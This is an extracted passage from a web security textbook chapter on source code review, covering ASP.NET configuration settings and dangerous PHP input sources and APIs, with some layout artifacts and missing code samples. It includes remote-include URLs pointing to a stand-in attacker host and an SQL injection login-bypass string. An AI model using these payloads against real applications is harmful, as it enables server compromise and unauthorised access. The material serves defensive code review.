The Web.config XML fi le in the web root directory contains confi guration
settings for the ASP.NET environment, listed in Table 19-6, and controls how
applications behave.
cc1199..iinndddd 772233 88//1199//22001111 1122::1188::3366 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 724
724 Chapter 19 n Finding Vulnerabilities in Source Code
Table 19-6: Security-Relevant Confi guration Settings for the ASP.NET Environment
SETTING DESCRIPTION
httpCookies Determines the security settings associated with cookies. If
the httpOnlyCookies attribute is set to true, cookies are
fl agged as HttpOnly and therefore are not directly accessible
from client-side scripts. If the requireSSL attribute is set to
true, cookies are fl agged as secure and therefore are trans-
mitted by browsers only within HTTPS requests.
sessionState Determines how sessions behave. The value of the timeout
attribute determines the time in minutes after which an idle
session will be expired. If the regenerateExpiredSessio-
nId element is set to true (which is the default), a new ses-
sion ID is issued when an expired session ID is received.
compilation Determines whether debugging symbols are compiled into
pages, resulting in more verbose debug error information.
If the debug attribute is set to true, debug symbols are
included.
customErrors Determines whether the application returns detailed error
messages in the event of an unhandled error. If the mode attri-
bute is set to On or RemoteOnly, the page identifi ed by the
defaultRedirect attribute is displayed to application users
in place of detailed system-generated messages.
httpRuntime Determines various runtime settings. If the enableHeader-
Checking attribute is set to true (which is the default), ASP.
NET checks request headers for potential injection attacks,
including cross-site scripting. If the enableVersionHeader
attribute is set to true (which is the default), ASP.NET out-
puts a detailed version string, which may be of use to an
attacker in researching vulnerabilities in specifi c versions of
the platform.
If sensitive data such as database connection strings is stored in the confi guration
fi le, it should be encrypted using the ASP.NET “protected confi guration” feature.
PHP
This section describes ways to acquire user-supplied input, ways to interact with
the user’s session, potentially dangerous APIs, and security-relevant confi gura-
tion options on the PHP platform.
Identifying User-Supplied Data
PHP uses a range of array variables to store user-submitted data, as listed in
Table 19-7.
cc1199..iinndddd 772244 88//1199//22001111 1122::1188::3366 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 725
Chapter 19 n Finding Vulnerabilities in Source Code 725
Table 19-7: Variables Used to Acquire User-Supplied Data on the PHP Platform
VARIABLE DESCRIPTION
$_GET Contains the parameters submitted in
the query string. These are accessed
$HTTP_GET_VARS
by name. For example, in the following
URL:
https://wahh-app.com/search
.php?query=foo
the value of the query parameter is
accessed using:
$_GET[‘query’]
$_POST Contains the parameters submitted in
the request body.
$HTTP_POST_VARS
$_COOKIE Contains the cookies submitted in the
request.
$HTTP_COOKIE_VARS
$_REQUEST Contains all the items in the $_GET,$_
POST, and $_COOKIE arrays.
$_FILES Contains the fi les uploaded in the
request.
$HTTP_POST_FILES
$_SERVER[‘REQUEST_METHOD’] Contains the method used in the HTTP
request.
$_SERVER[‘QUERY_STRING’] Contains the full query string submitted
in the request.
$_SERVER[‘REQUEST_URI’] Contains the full URL contained in the
request.
$_SERVER[‘HTTP_ACCEPT’] Contains the contents of the HTTP
Accept header.
$_SERVER[‘HTTP_ACCEPT_CHARSET’] Contains the contents of the HTTP
Accept-charset header.
$_SERVER[‘HTTP_ACCEPT_ Contains the contents of the HTTP
ENCODING’] Accept-encoding header.
$_SERVER[‘HTTP_ACCEPT_ Contains the contents of the HTTP
LANGUAGE’] Accept-language header.
$_SERVER[‘HTTP_CONNECTION’] Contains the contents of the HTTP
Connection header.
$_SERVER[‘HTTP_HOST’] Contains the contents of the HTTP Host
header.
Continued
cc1199..iinndddd 772255 88//1199//22001111 1122::1188::3366 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 726
726 Chapter 19 n Finding Vulnerabilities in Source Code
Table 19-7 (continued)
VARIABLE DESCRIPTION
$_SERVER[‘HTTP_REFERER’] Contains the contents of the HTTP
Referer header.
$_SERVER[‘HTTP_USER_AGENT’] Contains the contents of the HTTP
User-agent header.
$_SERVER[‘PHP_SELF’] Contains the name of the currently exe-
cuting script. Although the script name
itself is outside an attacker’s control,
path information can be appended to
this name. For example, if a script con-
tains the following code:
”>
an attacker can craft a cross-site script-
ing attack as follows:
/search.php/”>
and so on.
You should keep in mind various anomalies when attempting to identify
ways in which a PHP application is accessing user-supplied input:
n $GLOBALS is an array containing references to all variables that are defi ned in
the script’s global scope. It may be used to access other variables by name.
n If the confi guration directive register_globals is enabled, PHP creates
global variables for all request parameters — that is, everything contained
in the $_REQUEST array. This means that an application may access user
input simply by referencing a variable that has the same name as the
relevant parameter. If an application uses this method of accessing user-
supplied data, there may be no way to identify all instances of this other
than via a careful line-by-line review of the codebase to fi nd variables
used in this way.
n In addition to the standard HTTP headers identifi ed previously, PHP adds
an entry to the $_SERVER array for any custom HTTP headers received in
the request. For example, supplying the header:
Foo: Bar
causes:
$_SERVER[‘HTTP_FOO’] = “Bar”
cc1199..iinndddd 772266 88//1199//22001111 1122::1188::3366 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 727
Chapter 19 n Finding Vulnerabilities in Source Code 727
n Input parameters whose names contain subscripts in square brackets are
automatically converted into arrays. For example, requesting this URL:
https://wahh-app.com/search.php?query[a]=foo&query[b]=bar
causes the value of the $_GET[‘query’] variable to be an array contain-
ing two members. This may result in unexpected behavior within the
application if an array is passed to a function that expects a scalar value.
Session Interaction
PHP uses the $_SESSION array as a way to store and retrieve information within
the user’s session. For example:
$_SESSION[‘MyName’] = $_GET[‘username’]; // store user’s name
echo “Welcome “ . $_SESSION[‘MyName’]; // retrieve user’s name
The $HTTP_SESSION_VARS array may be used in the same way.
If register_globals is enabled (as discussed in the later section “Confi guring
the PHP Environment”), global variables may be stored within the current ses-
sion as follows:
$MyName = $_GET[‘username’];
session_register(“MyName”);
Potentially Dangerous APIs
This section describes some common PHP APIs that can introduce security
vulnerabilities if used in an unsafe manner.
File Access
PHP implements a large number of functions for accessing fi les, many of which
accept URLs and other constructs that may be used to access remote fi les.
The following functions are used to read or write the contents of a specifi ed
fi le. If user-controllable data is passed to these APIs, an attacker may be able to
exploit these to access arbitrary fi les on the server fi lesystem.
n fopen
n readfile
n file
n fpassthru
n gzopen
cc1199..iinndddd 772277 88//1199//22001111 1122::1188::3366 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 728
728 Chapter 19 n Finding Vulnerabilities in Source Code
n gzfile
n gzpassthru
n readgzfile
n copy
n rename
n rmdir
n mkdir
n unlink
n file_get_contents
n file_put_contents
n parse_ini_file
The following functions are used to include and evaluate a specifi ed PHP
script. If an attacker can cause the application to evaluate a fi le he controls, he
can achieve arbitrary command execution on the server.
n include
n include_once
n require
n require_once
n virtual
Note that even if it is not possible to include remote fi les, command execu-
tion may still be possible if there is a way to upload arbitrary fi les to a location
on the server.
The PHP confi guration option allow_url_fopen can be used to prevent some
fi le functions from accessing remote fi les. However, by default this option is
set to 1 (meaning that remote fi les are allowed), so the protocols listed in Table
19-8 can be used to retrieve a remote fi le.
Table 19-8: Network Protocols That Can Be Used to Retrieve a Remote File
PROTOCOL EXAMPLE
HTTP, HTTPS http://wahh-attacker.com/bad.php
FTP ftp://user:PI:EMAIL/bad.php
SSH ssh2.shell://user:PI:EMAIL:22/
xterm
ssh2.exec://user:PI:EMAIL:22/cmd
cc1199..iinndddd 772288 88//1199//22001111 1122::1188::3366 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 729
Chapter 19 n Finding Vulnerabilities in Source Code 729
Even if allow_url_fopen is set to 0, the methods listed in Table 19-9 may still
enable an attacker to access remote fi les (depending on the extensions installed).
Table 19-9: Methods That May Allow Access to Remote Files Even If allow_url_fopen
Is Set to 0
METHOD EXAMPLE
SMB \\wahh-attacker.com\bad.php
PHP input/output php://filter/resource=http://wahh-attacker.
streams com/bad.php
Compression streams compress.zlib://http://wahh-attacker.com/
bad.php
Audio streams ogg://http://wahh-attacker.com/bad.php
NOTE PHP 5.2 and later releases have a new option, allow_url_include,
which is disabled by default. This default confi guration prevents any of the
preceding methods from being used to specify a remote fi le when calling one
of the fi le include functions.
Database Access
The following functions are used to send a query to a database and retrieve
the results:
n mysql_query
n mssql_query
n pg_query
The SQL statement is passed as a simple string. If user-controllable input
is part of the string parameter, the application is probably vulnerable to SQL
injection. For example:
$username = “admin’ or 1=1--”;
$password = “foo”;
$sql=”SELECT * FROM users WHERE username = ‘$username’
AND password = ‘$password’”;
$result = mysql_query($sql, $link)
executes this unintended query:
SELECT * FROM users WHERE username = ‘admin’ or 1=1--’
AND password = ‘foo’
cc1199..iinndddd 772299 88//1199//22001111 1122::1188::3377 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 730
730 Chapter 19 n Finding Vulnerabilities in Source Code
The following functions can be used to create prepared statements. This
allows an application to create a SQL query containing parameter placeholders
and set their values in a secure and type-safe way:
n mysqli->prepare
n stmt->prepare
n stmt->bind_param
n stmt->execute
n odbc_prepare
If used as intended, this mechanism is not vulnerable to SQL injection. For
example:
$username = “admin’ or 1=1--”;
$password = “foo”;
$sql = $db_connection->prepare(
“SELECT * FROM users WHERE username = ? AND password = ?”);
$sql->bind_param(“ss”, $username, $password);
$sql->execute();
results in a query that is equivalent to the following:
SELECT * FROM users WHERE username = ‘admin’’ or 1=1--’
AND password = ‘foo’
Dynamic Code Execution
The following functions can be used to dynamically evaluate PHP code:
n eval
n call_user_func
n call_user_func_array
n call_user_method
n call_user_method_array
n create_function
The semicolon delimiter can be used to batch multiple statements. If user-
controllable data is passed into any of these functions, the application is probably
vulnerable to script injection.
The function preg_replace, which performs a regular expression search and
replace, can be used to run a specifi c piece of PHP code against every match if
called with the /e option. If user-controllable data appears in the PHP that is
dynamically executed, the application is probably vulnerable.
cc1199..iinndddd 773300 88//1199//22001111 1122::1188::3377 PPMM
Stuttard c19.indd V2 - 08/11/2011 Page 731
Chapter 19 n Finding Vulnerabilities in Source Code 731
Another interesting feature of PHP is the ability to invoke functions dynami-
cally via a variable containing the function’s name. For example, the following
code invokes the function specifi ed in the func parameter of the query string:
In this situation, a user can cause the application to invoke an arbitrary func-
tion (without parameters) by modifying the value of the func parameter. For
example, invoking the phpinfo function causes the application to output a large
amount of information about the PHP environment, including confi guration
options, OS information, and extensions.
OS Command Execution
These functions can be used to execute operating system commands:
n exec
n passthru
n popen
n proc_open
n shell_exec
n system
n The backtick operator (`)
In all these cases, commands can be chained together using the | character.
If user-controllable data is passed unfi ltered into any of these functions, the